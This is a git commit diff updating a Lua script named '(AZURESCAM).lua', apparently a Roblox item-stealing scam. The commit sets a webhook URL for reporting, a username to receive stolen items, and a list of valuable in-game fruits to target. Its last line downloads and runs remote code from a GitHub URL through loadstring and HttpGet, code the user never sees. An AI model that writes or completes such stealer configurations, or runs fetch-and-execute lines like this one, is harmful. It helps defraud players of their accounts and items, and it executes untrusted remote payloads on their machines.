0e0f5897a0f2445e4fc038fafa04486686739bf7
AZURICJOKER <badbloxify@gmail.com>
2025-04-10 18:16:46 +0545

    Update (AZURESCAM).lua

--- (AZURESCAM).lua
+++ (AZURESCAM).lua
@@ -1,5 +1,5 @@
-Webhook = "" -- << Your Webhook
-Usernames = {"uruserhereorsmthidk", "somealtuserhere2"} -- << Your username(-s).
-FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
+Webhook = "" -- << https://webhook-protect.vercel.app/api/webhook?id=NV9tTGJNVUh5ekRPWU5neG1ZWGNVdzpCX0h2SDlPeWlsMWU5YUtrVE96OTRid0hoTDBxenNpNDlpXzdTaEtDUDJGelZCU2xGd29iWkJVZEVsQ0dJMnQ1cy1qQkNud1FfVDk2Y254eFV3TVl6aS1YQ0NyYmdEOUZveUgyeTNoNE1UQzUtZnEzSjN0S0FOQ1RuVV9pcmRoT19CSkIxNXFkRmZ1a0JlSE5iVEMyeFRqLW1hYmNqcXdKSkJVYTk1QXd6ZGc
+Usernames = {"SKYWARSPLAYER109", "somealtuserhere2"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Dragon-Dragon", "Dough-Dough"} -- << Fruits you want
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
